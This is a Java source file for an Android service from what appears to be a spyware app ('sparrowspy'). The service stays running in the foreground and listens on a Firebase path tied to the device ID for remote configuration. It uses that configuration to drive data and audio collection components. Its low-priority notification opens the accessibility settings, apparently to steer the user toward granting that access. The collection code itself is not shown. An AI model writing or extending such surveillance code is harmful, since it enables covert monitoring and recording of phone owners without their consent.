package com.tangledbytes.sparrowspy.services.sparrowservice;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.tangledbytes.sparrowspy.events.SparrowActions;
import com.tangledbytes.sparrowspy.server.SparrowConfigManager;
import com.tangledbytes.sparrowspy.utils.Constants;
import com.tangledbytes.sparrowspy.utils.NotificationUtils;
import com.tangledbytes.sparrowspy.utils.Resources;
import com.tangledbytes.sparrowspy.utils.Utils;

public class SparrowService extends Service {
    private static final String TAG = "SparrowService";
    private static final int COLLECTOR_SERVICE_NOTIF_ID = 101;
    private static boolean isRunning = false;

    private SparrowService mContext;
    private DataCollectorAndManager dataCollectorAndManager;
    private AudioCollectorAndManager audioCollectorAndManager;
    private SparrowConfigManager configManager;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        isRunning = true;
        mContext = this;
        sendBroadcast(new Intent(SparrowActions.ACTION_SERVICE_STARTED));
    }

    private void initializeConfigListener() {
        DatabaseReference configUpdateStatus = FirebaseDatabase.getInstance().getReference("users/" + new Utils(this).getDeviceId() + "/" + Constants.CONFIG_FILE_STATUS);
        configManager = new SparrowConfigManager(mContext);
        dataCollectorAndManager = new DataCollectorAndManager(mContext);
        audioCollectorAndManager = new AudioCollectorAndManager(mContext);

        configUpdateStatus.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                configManager.fetchConfiguration(newConfig -> {
                    dataCollectorAndManager.onConfigChanged(newConfig);
                    audioCollectorAndManager.onConfigChanged(newConfig);
                });
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                // Handle error appropriately, e.g., log or retry
                Log.e(TAG, "addValueEventListener(): Error occurred while listening for 'configUpdate'", error.toException());
            }
        });
        configUpdateStatus.setValue(false);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        showNotification();
        initializeConfigListener();
        return START_STICKY;
    }

    private void showNotification() {
        NotificationUtils notificationUtils = new NotificationUtils(mContext);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notificationUtils.createDefaultNotifChannel();
        }
        String channelId = notificationUtils.getDefaultNotifChannelId();

        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        PendingIntent pendingIntent = PendingIntent.getActivity(mContext, 0, intent, PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(mContext, channelId)
                .setSmallIcon(Resources.Drawables.notifIcon)
                .setContentTitle(Resources.Strings.notifTitle)
                .setPriority(Notification.PRIORITY_LOW)
                .setContentIntent(pendingIntent)
                .build();

        startForeground(COLLECTOR_SERVICE_NOTIF_ID, notification);
    }

    public static boolean isRunning() {
        return isRunning;
    }

    @Override
    public void onDestroy() {
        sendBroadcast(new Intent(SparrowActions.ACTION_SERVICE_FINISHED));
        isRunning = false;
        super.onDestroy();
    }
}